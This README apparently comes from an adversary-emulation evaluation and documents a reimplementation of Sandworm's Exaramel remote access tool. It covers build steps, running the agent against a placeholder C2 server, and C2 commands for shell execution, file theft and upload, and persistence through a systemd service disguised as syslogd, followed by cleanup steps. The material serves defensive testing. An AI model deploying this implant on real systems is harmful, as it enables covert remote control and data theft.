# Exaramel

Exaramel is a Remote Access Tool known to be used by Sandworm to achieve C2 over HTTPS with their 
target systems. There exist versions for both Linux and Windows. While Go is a language that enables 
cross-compilation, the Linux and Windows specimens that were discovered and analyzed presented many 
differences in how they functioned. As a result, for the purposes of this evaluation, the code base 
for Exaramel has been split into two.

Exaramel for Linux provides basic RAT functionality. Specifically, it provides command execution and file upload and download capabilities. On startup, it creates a named UNIX domain socket which is used to ensure that it is the only instance of Exaramel running on the system. If a configuration file does not exist, it then writes one with default values. Lastly, Exaramel is supposed to automatically establish persistence, either through a user `crontab` or by writing a `systemd` service. However, for this evaluation, we have changed persistence to be established on demand, only when the RAT receives the specific command from the C2 server.


## Quick Start

```bash
# automatically build Exaramel for Linux and Windows; look for 'Exaramel-Linux' and 'Exaramel-Windows' in the Exaramel directory
make
ls -lsah

# upload Exaramel to target
How you get here is up to you

# Linux only: once the binary is on the target filesystem, set execute permissions
chmod 755 Exaramel-Linux
./Exaramel-Linux

# Windows
.\Exaramel-Windows
```

## Build Instructions

Use the 'make' utility as follows:

```bash
# automatically build Exaramel for Linux and Windows; look for 'Exaramel-Linux' and 'Exaramel-Windows' in the Exaramel directory
make
ls -lsah
```

## Test Instructions

```bash
go test ./...
````

## Usage Examples

#### Linux

Execute the agent:

    ```bash
    ./exaramel -server=<server_ip:port>
    ```

Commands to receive from the server:

    Set persistence:
        persist [cron|systemd]
    
    Execute a shell command:
        exec <shell_command>

    Download a file from the target:
        get <file_on_target> <filename_to_save_as>

    Upload file to target:
        put <file_to_upload> <filepath_on_target_to_upload_to>

Provide a command to the C2 Server:

    ./evalsC2Client.py --set-task exaramel-implant <command>

### Cleanup Instructions

Kill the Exaramel process and delete its binary from disk:

```bash
sudo pkill Exaramel-Linux
shred Exaramel-Linux
```

Delete persistence:

```
# Delete systemd stuff
systemctl disable syslogd.service
systemctl stop syslogd.service
shred /etc/systemd/system/syslogd.service

# Cleanup Exaramel-Linux socket
shred /tmp/.applocktx
```

### CTI Evidence

https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/

https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf


